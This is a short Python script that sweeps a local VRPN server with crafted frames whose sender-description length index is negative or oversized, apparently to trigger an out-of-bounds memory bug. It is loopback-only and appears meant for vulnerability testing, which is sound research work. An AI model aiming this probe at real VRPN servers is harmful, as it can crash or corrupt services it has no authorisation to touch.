#!/usr/bin/env python3
"""Loopback-only sweep of the VRPN sender-description length index."""
import argparse
import socket
import struct
import time

INDICES = ([-256, -192, -160, -128, -120, -112, -104, -96, -88, -80, -72,
           -64, -56, -48, -40, -32, -24, -16, -8,
           100, 104, 112, 128, 160, 192, 256, 512, 1024, 4096])


def frame(index):
    payload = struct.pack(">i", index) + b"AAAA"
    n = len(payload)
    msg = struct.pack(">IIIIII", 24 + n, 0, 0, 0, 0xFFFFFFFF, 0)
    msg += b"\0" * 4 + payload + b"\0" * (-n % 8)
    return msg


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=13897)
    args = ap.parse_args()
    with socket.create_connection(("127.0.0.1", args.port), timeout=5) as s:
        cookie = s.recv(24)
        s.sendall(cookie)
        time.sleep(0.3)
        for index in INDICES:
            s.sendall(frame(index))
            print(f"sent index={index}", flush=True)
            time.sleep(0.15)


if __name__ == "__main__":
    main()
